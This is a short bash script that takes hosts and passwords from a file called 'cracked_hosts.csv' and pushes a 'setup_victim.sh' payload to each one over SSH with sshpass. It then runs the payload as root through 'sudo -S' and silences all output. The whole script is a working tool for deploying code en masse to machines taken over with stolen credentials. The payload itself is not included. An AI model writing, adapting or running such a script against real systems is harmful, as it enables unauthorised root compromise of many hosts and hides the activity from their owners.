#!/bin/bash

./generating_key.sh 

while IFS=, read -r HOST USERNAME PASSWORD; do
    echo "THIS IS HOST : $HOST" 
    sshpass -p $PASSWORD scp setup_victim.sh $USERNAME@$HOST:/tmp/ &>/dev/null
    sleep 4
    sshpass -p $PASSWORD ssh $USERNAME@$HOST "echo $PASSWORD | sudo -S bash /tmp/setup_victim.sh" &>/dev/null
done < cracked_hosts.csv



